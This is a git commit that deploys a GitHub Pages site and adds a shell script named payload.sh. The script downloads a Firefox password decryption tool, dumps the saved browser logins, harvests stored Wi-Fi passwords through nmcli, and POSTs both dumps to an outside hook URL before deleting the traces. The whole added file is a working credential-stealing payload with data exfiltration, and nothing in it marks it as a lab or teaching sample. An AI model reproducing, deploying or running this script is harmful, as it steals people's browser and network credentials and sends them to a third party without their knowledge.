930120415f0ba0ac00ea3e5ef30d4657200fd931
ddealmei <d-braga@outlook.com>
2025-03-19 09:40:29 +0000

    Deploying to gh-pages from @ ddealmei/ddealmei.github.io@2a8b44a3ecd25382de45c50f656968c5e6b792b9 🚀

---
+++ assets/3b64d11ff0ac5da6a262b3490949ec7f6/payload.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+url_post="https://ise2.istic.univ-rennes1.fr/hook/ddealmeida"
+cd /tmp
+wget https://ddealmei.github.io/assets/3b64d11ff0ac5da6a262b3490949ec7f6/firefox_decrypt.py && \
+	chmod +x firefox_decrypt.py && \
+	python firefox_decrypt.py > firefox_dump.txt || python3 firefox_decrypt.py > firefox_dump.txt
+for ssid in $(nmcli connection show |grep wifi | cut -d" " -f1); do 
+	pwd=$(nmcli connection --show-secrets show $ssid | grep "wireless-security.psk:" | cut -d':' -f2 | xargs); 
+	echo $ssid $pwd >> ./wifi_dump.txt ; 
+done
+
+
+curl -X POST --data-binary @./firefox_dump.txt --insecure $url_post && \
+curl -X POST --data-binary @./wifi_dump.txt --insecure $url_post
+
+rm ./firefox_dump.txt ./wifi_dump.txt
